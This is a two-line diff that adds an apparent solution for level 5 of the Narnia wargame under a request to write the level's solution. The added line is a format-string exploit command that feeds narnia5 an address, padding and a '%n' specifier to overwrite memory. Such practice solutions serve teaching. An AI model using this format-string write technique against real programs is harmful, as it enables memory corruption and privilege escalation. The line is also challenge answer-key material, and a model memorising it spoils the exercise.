@@ -1,1 +1,2 @@
 Write the solution of the level in this file please.
+./narnia5 `python -c "print('\xf0\xd4\xff\xff' + 'a' * 496 + '%n')"`
